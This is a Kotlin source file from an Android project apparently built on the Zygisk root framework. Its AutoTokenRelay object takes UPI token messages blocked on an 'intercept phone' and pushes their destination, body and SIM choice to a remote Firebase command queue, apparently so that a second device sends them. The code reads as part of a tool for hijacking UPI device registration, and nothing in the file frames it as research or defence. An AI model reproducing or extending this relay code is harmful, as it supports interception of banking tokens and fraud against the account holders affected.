package com.hivirtus.zygiskmode

import android.content.Context
import android.util.Log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

/**
 * Intercept phone: UPI token block hone par Firebase command push karta hai.
 */
object AutoTokenRelay {

    private const val TAG = "AutoTokenRelay"
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    fun publishBlocked(context: Context, dest: String, body: String) {
        val appContext = context.applicationContext
        scope.launch {
            try {
                val config = FirebaseAutoTokenStore.load(appContext)
                if (!config.canIntercept() || !config.relayReady()) return@launch

                val client = FirebaseRestClient(config)
                val now = System.currentTimeMillis()
                val payload = linkedMapOf<String, Any?>(
                    "to" to dest.trim(),
                    "body" to body.trim(),
                    "message" to body.trim(),
                    "recipient" to dest.trim(),
                    "sim" to config.senderSimSlot,
                    "targetSim" to if (config.senderSimSlot == 0) "SIM1" else "SIM2",
                    "status" to "pending",
                    "from_device" to config.deviceId,
                    "created_at" to now
                )
                val pushId = client.push("hivirtus/commands/${config.senderDeviceId}", payload)
                if (pushId != null) {
                    Log.i(TAG, "Relay queued push=$pushId dest=$dest")
                } else {
                    Log.w(TAG, "Relay push failed dest=$dest")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Relay error: ${e.message}")
            }
        }
    }
}
